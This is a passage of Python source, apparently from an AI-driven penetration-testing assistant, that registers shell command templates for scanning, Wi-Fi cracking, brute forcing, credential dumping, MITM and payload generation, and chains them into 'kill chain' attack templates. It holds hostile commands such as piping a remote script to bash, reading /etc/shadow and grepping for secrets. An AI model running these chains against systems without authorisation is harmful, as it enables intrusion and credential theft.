import subprocess
import platform
import shutil
import os
import sys
import json
import re
import asyncio
import threading
import time
from pathlib import Path
from datetime import datetime

from actions.security_assessment_platform import AuthorizationContext, SecurityAssessmentPlatform

try:
    from core.ai_router import ask_ai, ask_best
    AI_AVAILABLE = True
except ImportError:
    AI_AVAILABLE = False

OS = platform.system()

_PLATFORM = SecurityAssessmentPlatform(storage_dir=str(Path(__file__).resolve().parent.parent / "reports"))


# ─────────────────────────────────────────────────────────────────────────────
# TOOL REGISTRY
# ─────────────────────────────────────────────────────────────────────────────
TOOL_REGISTRY = {

    # ── NETWORK RECONNAISSANCE ────────────────────────────────────────────────
    "nmap_scan": {
        "linux":   "sudo nmap {options} {target} --max-retries 1",
        "darwin":  "sudo nmap {options} {target}",
        "windows": "nmap {options} {target}",
        "description": "Port/service/OS scan"
    },
    "nmap_full": {
        "linux":   "sudo nmap -sV -sC -O -A -p- --open {target}",
        "darwin":  "sudo nmap -sV -sC -O -A -p- --open {target}",
        "windows": "nmap -sV -sC -A -p- --open {target}",
        "description": "Full aggressive nmap scan all ports"
    },
    "nmap_vuln": {
        "linux":   "sudo nmap --script vuln -sV {target}",
        "darwin":  "sudo nmap --script vuln -sV {target}",
        "windows": "nmap --script vuln -sV {target}",
        "description": "Nmap vulnerability script scan"
    },
    "nmap_udp": {
        "linux":   "sudo nmap -sU --top-ports 200 {target}",
        "darwin":  "sudo nmap -sU --top-ports 200 {target}",
        "windows": "nmap -sU --top-ports 200 {target}",
        "description": "UDP port scan top 200"
    },
    "nmap_stealth": {
        "linux":   "sudo nmap -sS -T2 -f --data-length 200 {target}",
        "darwin":  "sudo nmap -sS -T2 -f --data-length 200 {target}",
        "windows": "nmap -sS -T2 {target}",
        "description": "Stealth SYN scan with fragmentation"
    },
    "ping": {
        "linux":   "ping -c {count} {target}",
        "darwin":  "ping -c {count} {target}",
        "windows": "ping -n {count} {target}",
        "description": "Ping a host"
    },
    "traceroute": {
        "linux":   "traceroute {target}",
        "darwin":  "traceroute {target}",
        "windows": "tracert {target}",
        "description": "Trace route to host"
    },
    "whois": {
        "linux":   "whois {target}",
        "darwin":  "whois {target}",
        "windows": "whois {target}",
        "description": "WHOIS lookup"
    },
    "dig": {
        "linux":   "dig {target} {record_type}",
        "darwin":  "dig {target} {record_type}",
        "windows": "nslookup {target}",
        "description": "DNS lookup"
    },
    "netstat": {
        "linux":   "netstat -tulnp",
        "darwin":  "netstat -an",
        "windows": "netstat -ano",
        "description": "Show active connections"
    },
    "arp_scan": {
        "linux":   "sudo arp-scan -I $(ip route | grep default | awk '{print $5}') --localnet",
        "darwin":  "arp -a",
        "windows": "arp -a",
        "description": "Scan local network"
    },
    "curl_headers": {
        "linux":   "curl -I {target}",
        "darwin":  "curl -I {target}",
        "windows": "curl -I {target}",
        "description": "Get HTTP headers"
    },
    "masscan": {
        "linux":   "sudo masscan {target} -p{options} --rate=1000",
        "darwin":  "sudo masscan {target} -p{options} --rate=1000",
        "windows": "masscan {target} -p{options}",
        "description": "Ultra-fast port scanner"
    },
    "netdiscover": {
        "linux":   "sudo netdiscover -r {target} -P",
        "darwin":  "echo netdiscover not available on macOS",
        "windows": "echo netdiscover not available on Windows",
        "description": "Network host discovery"
    },
    "fping": {
        "linux":   "fping -a -g {target} 2>/dev/null",
        "darwin":  "fping -a -g {target} 2>/dev/null",
        "windows": "echo fping not available",
        "description": "Fast ping sweep of network range"
    },

    # ── WIRELESS ──────────────────────────────────────────────────────────────
    "wifi_scan": {
        "linux":   "nmcli dev wifi list",
        "darwin":  "/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s",
        "windows": "netsh wlan show networks mode=bssid",
        "description": "Scan WiFi networks"
    },
    "wifi_profiles": {
        "linux":   "nmcli connection show",
        "darwin":  "security find-generic-password -wa",
        "windows": "netsh wlan show profiles",
        "description": "List saved WiFi profiles"
    },
    "wifite": {
        "linux":   "sudo wifite {options}",
        "darwin":  "sudo wifite {options}",
        "windows": "echo wifite is not supported on Windows",
        "description": "Automated wireless attack tool"
    },
    "aircrack": {
        "linux":   "aircrack-ng {options} {file}",
        "darwin":  "aircrack-ng {options} {file}",
        "windows": "echo aircrack-ng not supported on Windows",
        "description": "Crack WEP/WPA keys from capture file"
    },
    "airodump": {
        "linux":   "sudo airodump-ng {interface}",
        "darwin":  "sudo airodump-ng {interface}",
        "windows": "echo airodump-ng not supported on Windows",
        "description": "Capture WiFi packets"
    },
    "airmon": {
        "linux":   "sudo airmon-ng {options} {interface}",
        "darwin":  "sudo airmon-ng {options} {interface}",
        "windows": "echo airmon-ng not supported on Windows",
        "description": "Enable/disable monitor mode on interface"
    },
    "aireplay": {
        "linux":   "sudo aireplay-ng {options} {interface}",
        "darwin":  "sudo aireplay-ng {options} {interface}",
        "windows": "echo aireplay-ng not supported on Windows",
        "description": "Inject packets / deauth attack"
    },
    "bettercap": {
        "linux":   "sudo bettercap {options}",
        "darwin":  "sudo bettercap {options}",
        "windows": "echo bettercap limited on Windows",
        "description": "Network attack and monitoring framework"
    },
    "hcxdumptool": {
        "linux":   "sudo hcxdumptool -i {interface} -o {file} {options}",
        "darwin":  "sudo hcxdumptool -i {interface} -o {file} {options}",
        "windows": "echo hcxdumptool not supported on Windows",
        "description": "Capture PMKID/EAPOL from WiFi networks"
    },
    "hcxtools": {
        "linux":   "hcxpcapngtool -o {file}.hash {file}",
        "darwin":  "hcxpcapngtool -o {file}.hash {file}",
        "windows": "echo hcxtools not supported on Windows",
        "description": "Convert capture to hashcat format"
    },

    # ── SYSTEM INFO ───────────────────────────────────────────────────────────
    "whoami": {
        "linux":   "whoami && id",
        "darwin":  "whoami && id",
        "windows": "whoami /all",
        "description": "Current user info"
    },
    "os_info": {
        "linux":   "uname -a && cat /etc/os-release",
        "darwin":  "uname -a && sw_vers",
        "windows": "systeminfo",
        "description": "OS information"
    },
    "process_list": {
        "linux":   "ps aux --sort=-%cpu | head -20",
        "darwin":  "ps aux | head -20",
        "windows": "tasklist /fo table",
        "description": "Running processes"
    },
    "open_ports": {
        "linux":   "ss -tulnp",
        "darwin":  "lsof -i -P -n | grep LISTEN",
        "windows": "netstat -ano | findstr LISTENING",
        "description": "Open ports on this machine"
    },
    "firewall_status": {
        "linux":   "sudo ufw status verbose",
        "darwin":  "sudo /usr/libexec/ApplicationFirewall/socketfilterfw --getglobalstate",
        "windows": "netsh advfirewall show allprofiles",
        "description": "Firewall status"
    },
    "env_vars": {
        "linux":   "env",
        "darwin":  "env",
        "windows": "set",
        "description": "Environment variables"
    },
    "cron_jobs": {
        "linux":   "crontab -l && cat /etc/crontab",
        "darwin":  "crontab -l",
        "windows": "schtasks /query /fo LIST",
        "description": "Scheduled tasks / cron jobs"
    },
    "hosts_file": {
        "linux":   "cat /etc/hosts",
        "darwin":  "cat /etc/hosts",
        "windows": "type C:\\Windows\\System32\\drivers\\etc\\hosts",
        "description": "Read hosts file"
    },
    "suid_files": {
        "linux":   "find / -perm -4000 -type f 2>/dev/null",
        "darwin":  "find / -perm -4000 -type f 2>/dev/null",
        "windows": "echo SUID not applicable on Windows",
        "description": "Find SUID files for privilege escalation"
    },
    "writable_dirs": {
        "linux":   "find / -writable -type d 2>/dev/null | grep -v proc | head -30",
        "darwin":  "find / -writable -type d 2>/dev/null | grep -v proc | head -30",
        "windows": "echo Use icacls on Windows",
        "description": "Find world-writable directories"
    },
    "sudo_perms": {
        "linux":   "sudo -l",
        "darwin":  "sudo -l",
        "windows": "whoami /priv",
        "description": "Check sudo/privilege permissions"
    },
    "network_interfaces": {
        "linux":   "ip addr && ip route",
        "darwin":  "ifconfig && netstat -rn",
        "windows": "ipconfig /all && route print",
        "description": "All network interfaces and routes"
    },
    "passwd_file": {
        "linux":   "cat /etc/passwd",
        "darwin":  "cat /etc/passwd",
        "windows": "net user",
        "description": "List users from passwd file"
    },
    "shadow_file": {
        "linux":   "sudo cat /etc/shadow",
        "darwin":  "sudo cat /etc/shadow",
        "windows": "echo No shadow file on Windows",
        "description": "Read shadow file (requires root)"
    },

    # ── PRIVILEGE ESCALATION ──────────────────────────────────────────────────
    "linpeas": {
        "linux":   "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | bash",
        "darwin":  "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | bash",
        "windows": "echo Use winpeas on Windows",
        "description": "Linux privilege escalation scanner (linPEAS)"
    },
    "winpeas": {
        "linux":   "echo Use winpeas on Windows",
        "darwin":  "echo Use winpeas on Windows",
        "windows": "winpeas.exe",
        "description": "Windows privilege escalation scanner (winPEAS)"
    },
    "gtfobins_check": {
        "linux":   "sudo -l 2>/dev/null | grep -v 'not allowed' | grep -E '(python|perl|ruby|bash|sh|nmap|vim|less|more|man|awk|find|tee|env|cut)'",
        "darwin":  "sudo -l 2>/dev/null",
        "windows": "echo GTFOBins not applicable on Windows",
        "description": "Check for GTFOBins exploitable sudo permissions"
    },
    "kernel_version": {
        "linux":   "uname -r && cat /proc/version",
        "darwin":  "uname -r && sw_vers",
        "windows": "ver",
        "description": "Get kernel version for exploit search"
    },

    # ── PASSWORD & HASH ───────────────────────────────────────────────────────
    "hash_identify": {
        "linux":   "hashid '{hash}'",
        "darwin":  "hashid '{hash}'",
        "windows": "hashid '{hash}'",
        "description": "Identify hash type"
    },
    "generate_hash": {
        "linux":   "echo -n '{text}' | {algorithm}sum",
        "darwin":  "echo -n '{text}' | {algorithm}sum",
        "windows": "certutil -hashfile NUL {algorithm}",
        "description": "Generate hash"
    },
    "password_strength": {
        "linux":   "echo '{password}' | cracklib-check",
        "darwin":  "echo '{password}' | cracklib-check",
        "windows": "echo Password analysis not native on Windows",
        "description": "Check password strength"
    },
    "hash_crack_online": {
        "linux":   "curl -s 'https://md5decrypt.net/Api/api.php?hash={hash}&hash_type=md5&email=a@a.com&code=code1'",
        "darwin":  "curl -s 'https://md5decrypt.net/Api/api.php?hash={hash}&hash_type=md5&email=a@a.com&code=code1'",
        "windows": "curl -s 'https://md5decrypt.net/Api/api.php?hash={hash}&hash_type=md5&email=a@a.com&code=code1'",
        "description": "Try to crack hash via online lookup"
    },

    # ── WEB & VULNERABILITY ───────────────────────────────────────────────────
    "nikto_scan": {
        "linux":   "nikto -h {target}",
        "darwin":  "nikto -h {target}",
        "windows": "nikto -h {target}",
        "description": "Web vulnerability scan"
    },
    "gobuster": {
        "linux":   "gobuster dir -u {target} -w /usr/share/wordlists/dirb/common.txt -t 50",
        "darwin":  "gobuster dir -u {target} -w /usr/share/wordlists/dirb/common.txt",
        "windows": "gobuster dir -u {target} -w wordlist.txt",
        "description": "Directory bruteforce"
    },
    "sqlmap": {
        "linux":   "sqlmap -u {target} --batch --level=3 --risk=2 {options}",
        "darwin":  "sqlmap -u {target} --batch --level=3 --risk=2 {options}",
        "windows": "python sqlmap.py -u {target} --batch",
        "description": "SQL injection scanner"
    },
    "wpscan": {
        "linux":   "wpscan --url {target} --enumerate u,vp,vt {options}",
        "darwin":  "wpscan --url {target} --enumerate u,vp,vt {options}",
        "windows": "wpscan --url {target} --enumerate u,vp,vt",
        "description": "WordPress vulnerability scan"
    },
    "ssl_check": {
        "linux":   "openssl s_client -connect {target}:443 -brief",
        "darwin":  "openssl s_client -connect {target}:443 -brief",
        "windows": "openssl s_client -connect {target}:443",
        "description": "SSL/TLS certificate check"
    },
    "curl_request": {
        "linux":   "curl -s -X {method} '{target}' {headers} {data}",
        "darwin":  "curl -s -X {method} '{target}' {headers} {data}",
        "windows": "curl -s -X {method} '{target}' {headers} {data}",
        "description": "Custom HTTP request"
    },
    "ffuf": {
        "linux":   "ffuf -u {target}/FUZZ -w {wordlist} {options}",
        "darwin":  "ffuf -u {target}/FUZZ -w {wordlist} {options}",
        "windows": "ffuf -u {target}/FUZZ -w {wordlist} {options}",
        "description": "Fast web fuzzer"
    },
    "dirb": {
        "linux":   "dirb {target} {wordlist} {options}",
        "darwin":  "dirb {target} {wordlist} {options}",
        "windows": "dirb {target} {wordlist} {options}",
        "description": "Web content scanner"
    },
    "wfuzz": {
        "linux":   "wfuzz -c -z file,{wordlist} {target}/FUZZ {options}",
        "darwin":  "wfuzz -c -z file,{wordlist} {target}/FUZZ {options}",
        "windows": "wfuzz -c -z file,{wordlist} {target}/FUZZ {options}",
        "description": "Web application fuzzer"
    },
    "xsstrike": {
        "linux":   "python3 XSStrike/xsstrike.py -u {target} {options}",
        "darwin":  "python3 XSStrike/xsstrike.py -u {target} {options}",
        "windows": "python XSStrike/xsstrike.py -u {target} {options}",
        "description": "Advanced XSS detection suite"
    },
    "commix": {
        "linux":   "commix --url={target} {options}",
        "darwin":  "commix --url={target} {options}",
        "windows": "commix --url={target} {options}",
        "description": "Command injection exploiter"
    },
    "burpsuite": {
        "linux":   "burpsuite &",
        "darwin":  "burpsuite &",
        "windows": "start burpsuite",
        "description": "Open Burp Suite web proxy"
    },
    "whatweb": {
        "linux":   "whatweb {target} {options}",
        "darwin":  "whatweb {target} {options}",
        "windows": "whatweb {target} {options}",
        "description": "Web technology fingerprinting"
    },

    # ── EXPLOITATION ──────────────────────────────────────────────────────────
    "metasploit": {
        "linux":   "msfconsole -q -x '{command}'",
        "darwin":  "msfconsole -q -x '{command}'",
        "windows": "msfconsole -q -x '{command}'",
        "description": "Metasploit console command"
    },
    "hydra": {
        "linux":   "hydra -l {username} -P {wordlist} {target} {service}",
        "darwin":  "hydra -l {username} -P {wordlist} {target} {service}",
        "windows": "hydra -l {username} -P {wordlist} {target} {service}",
        "description": "Brute force login"
    },
    "john": {
        "linux":   "john --wordlist={wordlist} {hash_file}",
        "darwin":  "john --wordlist={wordlist} {hash_file}",
        "windows": "john --wordlist={wordlist} {hash_file}",
        "description": "John the Ripper password cracker"
    },
    "hashcat": {
        "linux":   "hashcat -m {mode} {hash_file} {wordlist} --force",
        "darwin":  "hashcat -m {mode} {hash_file} {wordlist}",
        "windows": "hashcat -m {mode} {hash_file} {wordlist}",
        "description": "Hashcat GPU cracker"
    },
    "searchsploit": {
        "linux":   "searchsploit {target} {options}",
        "darwin":  "searchsploit {target} {options}",
        "windows": "searchsploit {target} {options}",
        "description": "Search ExploitDB offline"
    },
    "msfvenom": {
        "linux":   "msfvenom -p {options} LHOST={target} LPORT=4444 -f exe -o payload.exe",
        "darwin":  "msfvenom -p {options} LHOST={target} LPORT=4444 -f macho -o payload",
        "windows": "msfvenom -p {options} LHOST={target} LPORT=4444 -f exe -o payload.exe",
        "description": "Generate Metasploit payloads"
    },
    "beef": {
        "linux":   "cd /usr/share/beef-xss && ./beef",
        "darwin":  "cd /usr/share/beef-xss && ./beef",
        "windows": "echo BeEF not natively supported on Windows",
        "description": "Browser Exploitation Framework"
    },
    "social_engineer_toolkit": {
        "linux":   "sudo setoolkit",
        "darwin":  "sudo setoolkit",
        "windows": "echo SET not natively supported on Windows",
        "description": "Social Engineering Toolkit"
    },
    "crackmapexec": {
        "linux":   "crackmapexec {options} {target}",
        "darwin":  "crackmapexec {options} {target}",
        "windows": "crackmapexec {options} {target}",
        "description": "Network exploitation and enumeration"
    },
    "evil_winrm": {
        "linux":   "evil-winrm -i {target} -u {username} -p {password}",
        "darwin":  "evil-winrm -i {target} -u {username} -p {password}",
        "windows": "evil-winrm -i {target} -u {username} -p {password}",
        "description": "WinRM shell for Windows targets"
    },
    "impacket_psexec": {
        "linux":   "impacket-psexec {username}:{password}@{target}",
        "darwin":  "impacket-psexec {username}:{password}@{target}",
        "windows": "impacket-psexec {username}:{password}@{target}",
        "description": "PsExec-style remote execution via impacket"
    },
    "impacket_secretsdump": {
        "linux":   "impacket-secretsdump {username}:{password}@{target}",
        "darwin":  "impacket-secretsdump {username}:{password}@{target}",
        "windows": "impacket-secretsdump {username}:{password}@{target}",
        "description": "Dump password hashes remotely via impacket"
    },
    "responder": {
        "linux":   "sudo responder -I {interface} {options}",
        "darwin":  "sudo responder -I {interface} {options}",
        "windows": "echo Use Responder on Linux/Mac",
        "description": "LLMNR/NBT-NS/mDNS poisoner for credential capture"
    },
    "medusa": {
        "linux":   "medusa -h {target} -u {username} -P {wordlist} -M {service}",
        "darwin":  "medusa -h {target} -u {username} -P {wordlist} -M {service}",
        "windows": "echo medusa not supported on Windows",
        "description": "Fast parallel login brute forcer"
    },

    # ── POST EXPLOITATION ─────────────────────────────────────────────────────
    "mimikatz": {
        "linux":   "echo Mimikatz is a Windows tool — use via meterpreter",
        "darwin":  "echo Mimikatz is a Windows tool — use via meterpreter",
        "windows": "mimikatz.exe {options}",
        "description": "Credential dumping tool for Windows"
    },
    "pspy": {
        "linux":   "./pspy64 -pf -i 1000",
        "darwin":  "echo pspy not available on macOS",
        "windows": "echo pspy not available on Windows",
        "description": "Process spy — watch processes without root"
    },
    "find_creds": {
        "linux":   "grep -r 'password\\|passwd\\|secret\\|api_key\\|token' /var/www /etc /home 2>/dev/null --include='*.conf' --include='*.php' --include='*.py' --include='*.env' -l",
        "darwin":  "grep -r 'password\\|passwd\\|secret\\|api_key\\|token' /var/www /etc /home 2>/dev/null -l",
        "windows": "findstr /si password *.php *.yml *.env *.config",
        "description": "Search for credential files on the system"
    },

    # ── SNIFFING & MITM ───────────────────────────────────────────────────────
    "tcpdump": {
        "linux":   "sudo tcpdump -i {interface} -c {count} {filter}",
        "darwin":  "sudo tcpdump -i {interface} -c {count} {filter}",
        "windows": "windump -i {interface}",
        "description": "Packet capture"
    },
    "wireshark_cli": {
        "linux":   "tshark -i {interface} -c {count}",
        "darwin":  "tshark -i {interface} -c {count}",
        "windows": "tshark -i {interface} -c {count}",
        "description": "Wireshark CLI capture"
    },
    "arpspoof": {
        "linux":   "sudo arpspoof -i {interface} -t {target} {options}",
        "darwin":  "sudo arpspoof -i {interface} -t {target} {options}",
        "windows": "echo arpspoof not available on Windows",
        "description": "ARP spoofing for MITM"
    },
    "ettercap": {
        "linux":   "sudo ettercap -T -M arp:remote /{target}// // {options}",
        "darwin":  "sudo ettercap -T -M arp:remote /{target}// // {options}",
        "windows": "echo ettercap limited on Windows",
        "description": "Ettercap MITM attack"
    },

    # ── FORENSICS ─────────────────────────────────────────────────────────────
    "file_metadata": {
        "linux":   "exiftool {file}",
        "darwin":  "exiftool {file}",
        "windows": "exiftool {file}",
        "description": "Extract file metadata"
    },
    "strings_extract": {
        "linux":   "strings {file} | head -50",
        "darwin":  "strings {file} | head -50",
        "windows": "strings {file}",
        "description": "Extract strings from binary"
    },
    "file_type": {
        "linux":   "file {file}",
        "darwin":  "file {file}",
        "windows": "file {file}",
        "description": "Identify file type"
    },
    "hex_dump": {
        "linux":   "xxd {file} | head -30",
        "darwin":  "xxd {file} | head -30",
        "windows": "certutil -dump {file}",
        "description": "Hex dump of file"
    },
    "volatility": {
        "linux":   "volatility -f {file} {options}",
        "darwin":  "volatility -f {file} {options}",
        "windows": "volatility -f {file} {options}",
        "description": "Memory forensics framework"
    },
    "autopsy": {
        "linux":   "autopsy &",
        "darwin":  "autopsy &",
        "windows": "start autopsy",
        "description": "Open Autopsy digital forensics GUI"
    },
    "binwalk": {
        "linux":   "binwalk {options} {file}",
        "darwin":  "binwalk {options} {file}",
        "windows": "binwalk {options} {file}",
        "description": "Firmware analysis and extraction"
    },
    "foremost": {
        "linux":   "foremost -i {file} -o output/ {options}",
        "darwin":  "foremost -i {file} -o output/ {options}",
        "windows": "echo foremost not available on Windows",
        "description": "File carving / data recovery"
    },
    "stegsolve": {
        "linux":   "java -jar stegsolve.jar",
        "darwin":  "java -jar stegsolve.jar",
        "windows": "java -jar stegsolve.jar",
        "description": "Steganography image analyzer"
    },
    "zsteg": {
        "linux":   "zsteg {file} {options}",
        "darwin":  "zsteg {file} {options}",
        "windows": "zsteg {file} {options}",
        "description": "Detect hidden data in PNG/BMP files"
    },

    # ── STEGANOGRAPHY ─────────────────────────────────────────────────────────
    "steghide_extract": {
        "linux":   "steghide extract -sf {file} -p '{password}'",
        "darwin":  "steghide extract -sf {file} -p '{password}'",
        "windows": "steghide extract -sf {file} -p '{password}'",
        "description": "Extract hidden data from image"
    },
    "steghide_embed": {
        "linux":   "steghide embed -cf {file} -ef {secret} -p '{password}'",
        "darwin":  "steghide embed -cf {file} -ef {secret} -p '{password}'",
        "windows": "steghide embed -cf {file} -ef {secret} -p '{password}'",
        "description": "Hide data inside image"
    },

    # ── ADVANCED RECON ────────────────────────────────────────────────────────
    "subfinder": {
        "linux":   "subfinder -d {target} {options}",
        "darwin":  "subfinder -d {target} {options}",
        "windows": "subfinder -d {target} {options}",
        "description": "Subdomain discovery tool"
    },
    "amass": {
        "linux":   "amass enum -d {target} {options}",
        "darwin":  "amass enum -d {target} {options}",
        "windows": "amass enum -d {target} {options}",
        "description": "Advanced subdomain enumeration"
    },
    "theHarvester": {
        "linux":   "theHarvester -d {target} -b all {options}",
        "darwin":  "theHarvester -d {target} -b all {options}",
        "windows": "theHarvester -d {target} -b all {options}",
        "description": "OSINT email/subdomain/IP harvester"
    },
    "shodan": {
        "linux":   "shodan search {target} {options}",
        "darwin":  "shodan search {target} {options}",
        "windows": "shodan search {target} {options}",
        "description": "Search Shodan for exposed devices"
    },
    "maltego": {
        "linux":   "maltego",
        "darwin":  "maltego",
        "windows": "maltego",
        "description": "Open Maltego for OSINT visualization"
    },
    "recon_ng": {
        "linux":   "recon-ng -m {options}",
        "darwin":  "recon-ng -m {options}",
        "windows": "recon-ng -m {options}",
        "description": "Recon-ng OSINT framework"
    },
    "dnsenum": {
        "linux":   "dnsenum {target}",
        "darwin":  "dnsenum {target}",
        "windows": "dnsenum {target}",
        "description": "DNS enumeration tool"
    },
    "fierce": {
        "linux":   "fierce --domain {target}",
        "darwin":  "fierce --domain {target}",
        "windows": "fierce --domain {target}",
        "description": "DNS scanner for locating non-contiguous IP space"
    },

    # ── BLUETOOTH ─────────────────────────────────────────────────────────────
    "bluetoothctl": {
        "linux":   "bluetoothctl {options}",
        "darwin":  "system_profiler SPBluetoothDataType",
        "windows": "echo Use Bluetooth settings on Windows",
        "description": "Bluetooth scanner and controller"
    },
    "btscanner": {
        "linux":   "sudo btscanner",
        "darwin":  "echo btscanner not available on macOS",
        "windows": "echo btscanner not available on Windows",
        "description": "Bluetooth device scanner"
    },

    # ── REVERSE ENGINEERING ───────────────────────────────────────────────────
    "ghidra": {
        "linux":   "ghidraRun &",
        "darwin":  "ghidraRun &",
        "windows": "start ghidraRun.bat",
        "description": "Open Ghidra reverse engineering tool"
    },
    "gdb": {
        "linux":   "gdb {file} {options}",
        "darwin":  "gdb {file} {options}",
        "windows": "echo gdb available via WSL on Windows",
        "description": "GNU debugger"
    },
    "radare2": {
        "linux":   "r2 {options} {file}",
        "darwin":  "r2 {options} {file}",
        "windows": "r2 {options} {file}",
        "description": "Radare2 reverse engineering framework"
    },
    "objdump": {
        "linux":   "objdump -d {file} | head -50",
        "darwin":  "objdump -d {file} | head -50",
        "windows": "objdump -d {file}",
        "description": "Disassemble binary file"
    },
    "ltrace": {
        "linux":   "ltrace {file} {options}",
        "darwin":  "echo ltrace not available on macOS",
        "windows": "echo ltrace not available on Windows",
        "description": "Trace library calls"
    },
    "strace": {
        "linux":   "strace {file} {options}",
        "darwin":  "echo Use dtruss on macOS",
        "windows": "echo strace not available on Windows",
        "description": "Trace system calls"
    },
    "pwntools_template": {
        "linux":   "python3 -c \"from pwn import *; print('pwntools ready')\"",
        "darwin":  "python3 -c \"from pwn import *; print('pwntools ready')\"",
        "windows": "python -c \"from pwn import *; print('pwntools ready')\"",
        "description": "Verify pwntools CTF framework"
    },

    # ── VPN & ANONYMITY ───────────────────────────────────────────────────────
    "tor_start": {
        "linux":   "sudo systemctl start tor",
        "darwin":  "brew services start tor",
        "windows": "start tor",
        "description": "Start Tor service"
    },
    "tor_stop": {
        "linux":   "sudo systemctl stop tor",
        "darwin":  "brew services stop tor",
        "windows": "taskkill /IM tor.exe",
        "description": "Stop Tor service"
    },
    "proxychains": {
        "linux":   "proxychains {options} {command}",
        "darwin":  "proxychains {options} {command}",
        "windows": "echo proxychains not available on Windows",
        "description": "Route traffic through proxy chains"
    },
    "macchanger": {
        "linux":   "sudo macchanger {options} {interface}",
        "darwin":  "sudo ifconfig {interface} ether {options}",
        "windows": "echo Use registry to change MAC on Windows",
        "description": "Change MAC address"
    },

    # ── PASSWORD TOOLS ────────────────────────────────────────────────────────
    "crunch": {
        "linux":   "crunch {options} -o {file}",
        "darwin":  "crunch {options} -o {file}",
        "windows": "echo crunch not supported on Windows",
        "description": "Generate custom wordlists"
    },
    "cewl": {
        "linux":   "cewl {target} -d 2 -m 5 {options}",
        "darwin":  "cewl {target} -d 2 -m 5 {options}",
        "windows": "cewl {target} -d 2 -m 5 {options}",
        "description": "Generate wordlist from a website"
    },

    # ── AUTONOMOUS KILL CHAIN ─────────────────────────────────────────────────
    "auto_recon": {
        "linux":   "sudo nmap -sV -sC -O -p- --open {target} -oN /tmp/recon_{target}.txt",
        "darwin":  "sudo nmap -sV -sC -O -p- --open {target} -oN /tmp/recon_{target}.txt",
        "windows": "nmap -sV -sC -A --open {target}",
        "description": "Full automated recon scan with output saved"
    },
    "enum4linux": {
        "linux":   "enum4linux -a {target}",
        "darwin":  "enum4linux -a {target}",
        "windows": "echo enum4linux not available on Windows",
        "description": "SMB enumeration for Windows/Samba targets"
    },
    "smbclient": {
        "linux":   "smbclient -L //{target} -N",
        "darwin":  "smbclient -L //{target} -N",
        "windows": "net view \\\\{target}",
        "description": "List SMB shares"
    },
    "rpcclient": {
        "linux":   "rpcclient -U '' {target}",
        "darwin":  "rpcclient -U '' {target}",
        "windows": "echo rpcclient not available on Windows",
        "description": "RPC enumeration"
    },
    "snmpwalk": {
        "linux":   "snmpwalk -c public -v1 {target}",
        "darwin":  "snmpwalk -c public -v1 {target}",
        "windows": "snmpwalk -c public -v1 {target}",
        "description": "SNMP enumeration"
    },
    "ldapsearch": {
        "linux":   "ldapsearch -x -h {target} -b 'dc=domain,dc=com'",
        "darwin":  "ldapsearch -x -h {target} -b 'dc=domain,dc=com'",
        "windows": "echo Use ADExplorer on Windows",
        "description": "LDAP enumeration"
    },

    # ── CUSTOM COMMAND ────────────────────────────────────────────────────────
    "custom": {
        "linux":   "{command}",
        "darwin":  "{command}",
        "windows": "{command}",
        "description": "Run any custom terminal command"
    },
}


# ─────────────────────────────────────────────────────────────────────────────
# KILL CHAIN TEMPLATES
# ─────────────────────────────────────────────────────────────────────────────
KILL_CHAIN_TEMPLATES = {
    "full_recon": [
        {"step": 1, "tool": "nmap_full",       "desc": "Full port scan"},
        {"step": 2, "tool": "nmap_vuln",        "desc": "Vulnerability scripts"},
        {"step": 3, "tool": "whatweb",          "desc": "Web fingerprint"},
        {"step": 4, "tool": "nikto_scan",       "desc": "Web vuln scan"},
        {"step": 5, "tool": "gobuster",         "desc": "Directory bruteforce"},
        {"step": 6, "tool": "searchsploit",     "desc": "Search exploits"},
    ],
    "web_attack": [
        {"step": 1, "tool": "whatweb",          "desc": "Fingerprint target"},
        {"step": 2, "tool": "nikto_scan",       "desc": "Web vulnerability scan"},
        {"step": 3, "tool": "gobuster",         "desc": "Find hidden directories"},
        {"step": 4, "tool": "sqlmap",           "desc": "SQL injection test"},
        {"step": 5, "tool": "xsstrike",         "desc": "XSS detection"},
        {"step": 6, "tool": "commix",           "desc": "Command injection test"},
    ],
    "network_attack": [
        {"step": 1, "tool": "nmap_scan",        "desc": "Initial port scan"},
        {"step": 2, "tool": "enum4linux",       "desc": "SMB enumeration"},
        {"step": 3, "tool": "smbclient",        "desc": "List shares"},
        {"step": 4, "tool": "snmpwalk",         "desc": "SNMP enumeration"},
        {"step": 5, "tool": "hydra",            "desc": "Brute force services"},
    ],
    "privesc_linux": [
        {"step": 1, "tool": "whoami",           "desc": "Current user context"},
        {"step": 2, "tool": "sudo_perms",       "desc": "Check sudo permissions"},
        {"step": 3, "tool": "suid_files",       "desc": "Find SUID binaries"},
        {"step": 4, "tool": "cron_jobs",        "desc": "Check cron jobs"},
        {"step": 5, "tool": "writable_dirs",    "desc": "Find writable directories"},
        {"step": 6, "tool": "find_creds",       "desc": "Search for credentials"},
        {"step": 7, "tool": "kernel_version",   "desc": "Check kernel for exploits"},
        {"step": 8, "tool": "gtfobins_check",   "desc": "Check GTFOBins abuse"},
    ],
    "wifi_attack": [
        {"step": 1, "tool": "airmon",           "desc": "Enable monitor mode"},
        {"step": 2, "tool": "airodump",         "desc": "Capture WiFi packets"},
        {"step": 3, "tool": "aireplay",         "desc": "Deauth attack"},
        {"step": 4, "tool": "aircrack",         "desc": "Crack handshake"},
    ],
    "password_audit": [
        {"step": 1, "tool": "hash_identify",    "desc": "Identify hash type"},
        {"step": 2, "tool": "hashcat",          "desc": "GPU crack"},
        {"step": 3, "tool": "john",             "desc": "John fallback"},
    ],
    "ctf_web": [
        {"step": 1, "tool": "curl_headers",     "desc": "Read HTTP headers"},
        {"step": 2, "tool": "gobuster",         "desc": "Find hidden paths"},
        {"step": 3, "tool": "sqlmap",           "desc": "Test SQL injection"},
        {"step": 4, "tool": "xsstrike",         "desc": "Test XSS"},
        {"step": 5, "tool": "commix",           "desc": "Test command injection"},
        {"step": 6, "tool": "ffuf",             "desc": "Fuzz parameters"},
    ],
    "smb_attack": [
        {"step": 1, "tool": "nmap_scan",        "desc": "Scan for SMB ports"},
        {"step": 2, "tool": "enum4linux",       "desc": "Full SMB enumeration"},
        {"step": 3, "tool": "smbclient",        "desc": "List SMB shares"},
        {"step": 4, "tool": "rpcclient",        "desc": "RPC enumeration"},
        {"step": 5, "tool": "crackmapexec",     "desc": "CrackMapExec attack"},
    ],
    "ad_attack": [
        {"step": 1, "tool": "nmap_scan",        "desc": "Port scan DC"},
